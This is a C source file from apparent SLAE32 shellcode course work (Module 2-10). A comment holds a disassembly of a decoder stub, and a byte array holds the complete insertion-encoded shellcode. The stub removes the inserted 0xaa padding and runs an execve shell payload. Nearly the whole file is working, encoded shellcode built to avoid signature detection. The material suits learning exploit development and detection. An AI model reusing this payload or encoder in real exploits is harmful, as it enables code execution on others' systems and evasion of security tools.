/*
Following video: Module 2-10: Insert encoder
Using code from NASM\2-10

    /mnt/git/NASM/SLAE32/2-10_INSERT/execve-insert-decoder:     file format elf32-i386

    Disassembly of section .text:

    08049000 <_start>:
     8049000:       eb 1d                   jmp    804901f <call_shellcode>

    08049002 <decoder>:
     8049002:       5e                      pop    esi
     8049003:       8d 7e 01                lea    edi,[esi+0x1]
     8049006:       31 c0                   xor    eax,eax
     8049008:       b0 01                   mov    al,0x1
     804900a:       31 db                   xor    ebx,ebx

    0804900c <decode>:
     804900c:       8a 1c 06                mov    bl,BYTE PTR [esi+eax*1]
     804900f:       80 f3 aa                xor    bl,0xaa
     8049012:       75 10                   jne    8049024 <EncodedShellcode>
     8049014:       8a 5c 06 01             mov    bl,BYTE PTR [esi+eax*1+0x1]
     8049018:       88 1f                   mov    BYTE PTR [edi],bl
     804901a:       47                      inc    edi
     804901b:       04 02                   add    al,0x2
     804901d:       eb ed                   jmp    804900c <decode>

    0804901f <call_shellcode>:
     804901f:       e8 de ff ff ff          call   8049002 <decoder>

    08049024 <EncodedShellcode>:
     8049024:       31 aa c0 aa 50 aa       xor    DWORD PTR [edx-0x55af5540],ebp
     804902a:       68 aa 62 aa 61          push   0x61aa62aa
     804902f:       aa                      stos   BYTE PTR es:[edi],al
     8049030:       73 aa                   jae    8048fdc <_start-0x24>
     8049032:       68 aa 68 aa 62          push   0x62aa68aa
     8049037:       aa                      stos   BYTE PTR es:[edi],al
     8049038:       69 aa 6e aa 2f aa       imul   ebp,DWORD PTR [edx-0x55d05592],0xaa2faa68
     804903e:       68 aa 2f aa 
     8049042:       2f                      das    
     8049043:       aa                      stos   BYTE PTR es:[edi],al
     8049044:       2f                      das    
     8049045:       aa                      stos   BYTE PTR es:[edi],al
     8049046:       2f                      das    
     8049047:       aa                      stos   BYTE PTR es:[edi],al
     8049048:       89 aa e3 aa 50 aa       mov    DWORD PTR [edx-0x55af551d],ebp
     804904e:       89 aa e2 aa 53 aa       mov    DWORD PTR [edx-0x55ac551e],ebp
     8049054:       89 aa e1 aa b0 aa       mov    DWORD PTR [edx-0x554f551f],ebp
     804905a:       0b aa cd aa 80 aa       or     ebp,DWORD PTR [edx-0x557f5533]
     8049060:       bb                      .byte 0xbb
     8049061:       bb                      .byte 0xbb
*/

unsigned char shellcode[] = {
"\xeb\x1d\x5e\x8d\x7e\x01\x31\xc0\xb0\x01\x31\xdb\x8a\x1c\x06\x80"
"\xf3\xaa\x75\x10\x8a\x5c\x06\x01\x88\x1f\x47\x04\x02\xeb\xed\xe8"
"\xde\xff\xff\xff\x31\xaa\xc0\xaa\x50\xaa\x68\xaa\x62\xaa\x61\xaa"
"\x73\xaa\x68\xaa\x68\xaa\x62\xaa\x69\xaa\x6e\xaa\x2f\xaa\x68\xaa"
"\x2f\xaa\x2f\xaa\x2f\xaa\x2f\xaa\x89\xaa\xe3\xaa\x50\xaa\x89\xaa"
"\xe2\xaa\x53\xaa\x89\xaa\xe1\xaa\xb0\xaa\x0b\xaa\xcd\xaa\x80\xaa"
"\xbb\xbb"
};

unsigned int shellcode_len = sizeof(shellcode)-1;